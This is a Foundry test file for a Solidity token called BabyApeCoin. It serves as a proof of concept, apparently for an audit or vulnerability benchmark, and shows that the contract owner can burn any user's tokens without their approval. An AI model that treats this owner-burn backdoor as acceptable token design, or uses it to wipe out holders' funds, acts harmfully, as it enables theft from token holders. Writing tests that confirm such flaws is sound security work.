// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/BabyApeCoin.sol";

contract BabyApeCoinTest is Test {
    BabyApeCoin token;
    address owner = address(0x1);
    address user = address(0x2);
    uint256 constant USER_BALANCE = 100 ether;
    
    function setUp() public {
        vm.startPrank(owner);
        token = new BabyApeCoin();
        // Transfer tokens to user
        token.transfer(user, USER_BALANCE);
        vm.stopPrank();
    }

    function testOwnerCanBurnUserTokensWithoutApproval() public {
        // Verify initial user balance
        assertEq(token.balanceOf(user), USER_BALANCE);

        console.log("--- BEFORE-Trigger Burn ---");
        uint256 userBalanceBefore = token.balanceOf(user);
        uint256 totalSupplyBefore = token.totalSupply();
        console.log("User balance before burn: ", userBalanceBefore);
        console.log("Total supply before burn: ", totalSupplyBefore);
        assertEq(userBalanceBefore, USER_BALANCE);

        console.log("--- Trigger Burn ---");
        // Owner burns user's tokens without approval
        vm.prank(owner);
        token.burn(user, USER_BALANCE);

        console.log("--- AFTER-Trigger Burn ---");
        uint256 userBalanceAfter = token.balanceOf(user);
        uint256 totalSupplyAfter = token.totalSupply();
        console.log("User balance after burn: ", userBalanceAfter);
        console.log("Total supply after burn: ", totalSupplyAfter);

        // Check if vulnerability is exploited
        bool vulnerabilityExists = (userBalanceAfter == 0) && 
                                  (totalSupplyAfter == totalSupplyBefore - USER_BALANCE);
        
        if (vulnerabilityExists) {
            console.log("Vulnerability Exists: Owner can burn user tokens without approval");
        } else {
            console.log("Vulnerability not Exist: Burn operation did not execute as expected");
            // Fail test explicitly when vulnerability doesn't manifest
            assert(false);
        }
    }
}